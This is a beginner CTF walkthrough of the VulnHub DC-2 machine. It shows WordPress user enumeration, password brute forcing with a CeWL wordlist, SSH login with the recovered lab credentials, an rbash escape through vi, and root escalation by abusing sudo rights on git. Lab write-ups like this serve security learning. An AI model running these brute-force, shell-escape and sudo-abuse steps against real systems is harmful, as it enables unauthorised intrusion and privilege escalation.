# DC-2 VulnHub Walkthrough

This walkthrough documents my approach to solving the DC-2 machine from VulnHub.  
The lab focused on WordPress enumeration, password discovery, restricted shell escape techniques, and Linux privilege escalation.

---

# Lab Information

- Machine: DC-2
- Platform: VulnHub
- Difficulty: Beginner
- Operating System: Debian Linux
<img width="960" height="502" alt="image" src="https://github.com/user-attachments/assets/a2bdb2fb-597b-4294-88b5-9f97ee28e67a" />

## Tools Used

- Nmap
- Dirsearch
- WPScan
- CeWL
- SSH
- Linux Enumeration Commands
- GTFOBins

---

# Network Discovery

The first step was identifying the target machine on the local network.

```bash
nmap -sn 192.168.1.0/24
```

The scan revealed the target system running on the VirtualBox network.

<img width="1919" height="471" alt="image" src="https://github.com/user-attachments/assets/af70a9f1-2f77-42d0-b480-5a9ee7af60c0" />

---

# Port Scanning

A full TCP scan was performed to identify running services and versions.

```bash
nmap -sS -sC -sV -p- 192.168.1.9
```

The scan revealed the following important ports:

- Port 80 → HTTP (Apache Web Server)
- Port 7744 → SSH

While browsing the website, it redirected to `dc-2`, indicating that the application depended on virtual host configuration.

<img width="1907" height="429" alt="image" src="https://github.com/user-attachments/assets/001de935-b153-41c0-a02f-b6bb72383af1" />


---

# Hosts File Configuration

To properly access the web application, the hosts file was updated.

```bash
sudo nano /etc/hosts
```

Added the following entry:

```bash
192.168.1.9 dc-2
```

After updating the hosts file, the WordPress site loaded correctly in the browser.

<img width="1918" height="155" alt="image" src="https://github.com/user-attachments/assets/8549c809-1aaf-4246-926a-99501d3d641a" />


---

# Web Enumeration

The homepage appeared to be a WordPress site.  
Basic enumeration was performed manually along with directory discovery.

```bash
dirsearch -u http://dc-2 -x 403
```

Important files and directories discovered:

- `/wp-admin`
- `/wp-login.php`
- `/xmlrpc.php`
- `/readme.html`

The `robots.txt` file also contained useful information.

<img width="1919" height="676" alt="image" src="https://github.com/user-attachments/assets/f796ffb9-3e52-4207-8ba3-c508997fe295" />


---

# WordPress Enumeration

WPScan was used to enumerate users and gather additional information about the WordPress installation.

```bash
wpscan --url http://dc-2 --enumerate
```

The scan revealed:

- WordPress version information
- XML-RPC enabled
- Enumerated users:
  - admin
  - tom
  - jerry

<img width="1919" height="808" alt="image" src="https://github.com/user-attachments/assets/e8a109b5-057b-4824-9f42-69ef51696b73" />
<img width="1919" height="775" alt="image" src="https://github.com/user-attachments/assets/6c7787b0-0c43-4a25-acd7-4baa4365da06" />



---

# Password Discovery

A hint on the homepage mentioned:

> "maybe you just need to be cewl"

This suggested using CeWL to generate a custom wordlist from the website content.

```bash
cewl http://dc-2 -w cewl.txt
```

After generating the wordlist, WPScan was used for password brute forcing.

```bash
wpscan --url http://dc-2 -U users.txt -P cewl.txt
```

Valid credentials recovered:

- tom : parturient
- jerry : adipiscing

<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/84df23b0-5339-4b51-aa59-b39f5de2af5e" />
<img width="1919" height="356" alt="image" src="https://github.com/user-attachments/assets/aa1e88c7-425e-4183-9c1a-7eb5c18343fd" />

---

# Initial Access via SSH

SSH access was attempted using the discovered credentials.

```bash
ssh tom@dc-2 -p 7744
```

Login was successful, but the shell appeared to be restricted.

The current shell was verified using:

```bash
echo $SHELL
```

Output:

```bash
/bin/rbash
```

<img width="1919" height="404" alt="image" src="https://github.com/user-attachments/assets/fea46740-8a93-4171-b1fe-12a64caa71e1" />


---

# Restricted Shell Escape

The environment variables and available binaries were inspected.

```bash
echo $PATH
```

Available binaries inside the user's directory were listed.

```bash
ls -la /home/tom/usr/bin
```

Interesting binaries discovered:

- vi
- less

Since `vi` was available, it was used to escape the restricted shell.

```bash
vi
```

Inside `vi`, the following commands were executed:

```bash
:set shell=/bin/bash
:shell
```

A normal bash shell was obtained successfully.

The PATH variable was then restored.

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```

<img width="1919" height="807" alt="image" src="https://github.com/user-attachments/assets/7c699cf7-0c80-4631-a0b4-31b4a00113f0" />
<img width="1919" height="290" alt="image" src="https://github.com/user-attachments/assets/db35cdae-7b25-40c4-9312-001376c307d2" />

---

# User Pivoting

While enumerating the system, another flag provided a clue related to the `jerry` user account.

Switching users was attempted using:

```bash
su jerry
```

The previously discovered WordPress password worked successfully.

Access to the `jerry` account was obtained.

<img width="1919" height="755" alt="image" src="https://github.com/user-attachments/assets/ea14fd76-4bca-47a7-a009-402cf2b4ded3" />
<img width="1919" height="504" alt="image" src="https://github.com/user-attachments/assets/c12fe076-6f8c-449f-91df-f36fcd870efa" />


---

# Sudo Enumeration

Sudo permissions were checked to identify privilege escalation opportunities.

```bash
sudo -l
```

The following permission was discovered:

```bash
(root) NOPASSWD: /usr/bin/git
```

This indicated that `git` could be executed as root without requiring a password.

<img width="1919" height="113" alt="image" src="https://github.com/user-attachments/assets/1b31b80e-ccca-4859-a1c3-2937bd3633c0" />


---

# Privilege Escalation via Git

GTFOBins was referenced to identify privilege escalation techniques involving `git`.

The following command was executed:

```bash
sudo git help config
```

Once the pager opened, a shell was spawned using:

```bash
!/bin/bash
```

Root access was obtained successfully.

Verification:

```bash
whoami
```

Output:

```bash
root
```

<img width="1918" height="685" alt="image" src="https://github.com/user-attachments/assets/53f00634-8028-45ae-9333-26a451a2197c" />


---

# Capturing the Final Flag

After gaining root privileges, the final flag was located inside the root directory.

```bash
cd /root
cat final-flag.txt
```

The machine was successfully rooted.

<img width="1919" height="491" alt="image" src="https://github.com/user-attachments/assets/f08ad648-8145-48e4-86fa-15b821535287" />


---

# Conclusion

This machine was a good beginner-friendly lab that covered several important concepts including:

- WordPress enumeration
- User enumeration
- Custom wordlist generation
- Password attacks
- Restricted shell escape
- Linux privilege escalation
- GTFOBins usage

The lab also reinforced the importance of proper sudo configurations and secure shell restrictions.
